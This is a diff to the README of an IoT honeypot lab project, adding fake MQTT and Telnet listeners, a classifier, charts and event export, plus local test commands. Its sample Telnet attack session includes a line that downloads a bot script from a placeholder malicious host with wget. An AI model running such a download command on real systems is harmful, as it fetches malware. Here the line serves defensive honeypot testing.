@@ -6,9 +6,12 @@ This starter includes:
 
 - Fake IoT HTTP admin panel
 - Fake IoT shell listener on port `2222`
+- Fake MQTT listener on port `1883`
+- Fake Telnet listener on port `23`
 - SQLite logging
-- Rule-based attack classifier
-- Simple dashboard/API using Flask
+- Rule-based and optional ML attack classifier
+- Simple dashboard/API using Flask with charts
+- JSON and CSV event export
 - Safe local testing commands
 
 > Important: This starter is for controlled lab/demo use. Do not expose it directly to the public internet.
@@ -41,6 +44,8 @@ It will start:
 | Dashboard | http://127.0.0.1:5000 |
 | Fake HTTP IoT Admin Panel | http://127.0.0.1:8080 |
 | Fake IoT Shell | 127.0.0.1:2222 |
+| Fake MQTT | 127.0.0.1:1883 |
+| Fake Telnet | 127.0.0.1:23 |
 
 ---
 
@@ -98,6 +103,48 @@ API endpoint:
 http://127.0.0.1:5000/api/events
 ```
 
+Export endpoints:
+
+```text
+http://127.0.0.1:5000/api/export?format=json
+http://127.0.0.1:5000/api/export?format=csv
+```
+
+---
+
+## 6. Test fake MQTT probe
+
+Send a raw MQTT CONNECT packet:
+
+```bash
+printf '\x10\x0e\x00\x04MQTT\x04\x02\x00\x3c\x00\x00' | nc 127.0.0.1 1883
+```
+
+Send a raw MQTT SUBSCRIBE packet:
+
+```bash
+printf '\x82\x0c\x00\x01\x00\x07sensors\x00' | nc 127.0.0.1 1883
+```
+
+---
+
+## 7. Test fake Telnet attack
+
+Use `telnet`:
+
+```bash
+telnet 127.0.0.1 23
+```
+
+Then type commands:
+
+```bash
+whoami
+uname -a
+wget http://malicious-site/bot.sh
+exit
+```
+
 ---
 
 ## Project structure
@@ -110,7 +157,9 @@ adaptive-iot-honeypot-starter/
 │   └── config.py
 ├── services/
 │   ├── fake_http.py
-│   └── fake_shell.py
+│   ├── fake_mqtt.py
+│   ├── fake_shell.py
+│   └── fake_telnet.py
 ├── analyzer/
 │   └── classifier.py
 ├── data/
@@ -124,10 +173,8 @@ adaptive-iot-honeypot-starter/
 
 ## Next improvements
 
-1. Add fake MQTT service.
-2. Add fake Telnet service.
-3. Add Docker support.
-4. Add charts to the dashboard.
-5. Add ML classifier using scikit-learn.
-6. Export JSON/CSV/PDF reports.
-7. Add STIX-style threat intelligence output.
+1. Add Docker support.
+2. Add PDF reports.
+3. Add STIX-style threat intelligence output.
+4. Add stronger MQTT protocol parsing.
+5. Add authentication/session tracking across services.
